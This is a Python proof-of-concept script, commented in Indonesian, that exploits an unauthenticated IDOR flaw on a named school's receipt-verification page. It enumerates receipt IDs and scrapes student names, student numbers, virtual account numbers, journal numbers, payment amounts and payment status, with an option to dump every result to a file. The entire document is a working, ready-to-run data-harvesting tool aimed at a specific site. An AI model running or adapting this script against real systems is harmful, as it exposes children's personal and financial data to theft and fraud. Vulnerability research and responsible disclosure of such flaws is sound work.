#!/usr/bin/env python3
"""
PoC — IDOR / Enumerasi Kwitansi tanpa Autentikasi.

Target : GET https://www.pedagogiai.smpm12gkb.sch.id/verifikasi-kwitansi/<id>
Auth   : TIDAK ADA.
Dampak : id integer dapat di-enumerate. Setiap id valid mengembalikan kwitansi
         pembayaran berisi PII: nama siswa, NIS/kelas, nomor jurnal, nomor
         virtual account, total nominal, status pembayaran.

Contoh:
  python3 poc_idor_kwitansi.py --id 1
  python3 poc_idor_kwitansi.py --start 1 --end 50
  python3 poc_idor_kwitansi.py --start 1 --end 200 --dump out.txt
"""
import re, sys, argparse, urllib.request

BASE = "https://www.pedagogiai.smpm12gkb.sch.id"
URL = BASE + "/verifikasi-kwitansi/%s"


def fetch(k: str) -> str:
    req = urllib.request.Request(
        URL % k,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0"},
    )
    return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", "replace")


def parse(html: str) -> dict:
    t = re.sub(r"<script.*?</script>|<style.*?</style>", " ", html, flags=re.S)
    t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", t))
    def grab(p):
        m = re.search(p, t)
        if not m:
            return None
        return (m.group(1) if m.groups() else m.group(0)).strip()
    return {
        "inv": grab(r"#INV-\d+"),
        "nama": grab(r"Nama Siswa\s*(.+?)\s*(?:NIS|NISN|Kelas)"),
        "nis": grab(r"NIS / Kelas\s*([0-9]+)"),
        "va": grab(r"Virtual Account\s*([0-9]+)"),
        "jurnal": grab(r"No\. Jurnal Pembukuan\s*([0-9]+)"),
        "nominal": grab(r"Total Nominal\s*(Rp[\d\. ]+)"),
        "status": grab(r"Status Pembayaran\s*.{0,3}\s*([A-Za-z ]+)"),
    }


def main():
    ap = argparse.ArgumentParser(description="IDOR kwitansi PedaGogiAI")
    ap.add_argument("--id", help="satu id")
    ap.add_argument("--start", type=int)
    ap.add_argument("--end", type=int)
    ap.add_argument("--dump", help="tulis hasil ke file")
    a = ap.parse_args()

    ids = [a.id] if a.id else list(range(a.start, a.end + 1))
    out = open(a.dump, "w") if a.dump else None
    seen = set()
    for i in ids:
        try:
            d = parse(fetch(str(i)))
        except Exception as e:
            print("id=%-4s error %s" % (i, e))
            continue
        if not d["inv"]:
            continue
        line = "id=%-4s %s | nama=%s | nis=%s | va=%s | jurnal=%s | %s | %s" % (
            i, d["inv"], d["nama"], d["nis"], d["va"], d["jurnal"], d["nominal"], d["status"])
        key = (d["inv"], d["va"], d["jurnal"])
        if key in seen:
            continue
        seen.add(key)
        print(line)
        if out:
            out.write(line + "\n")
    if out:
        out.close()


if __name__ == "__main__":
    main()
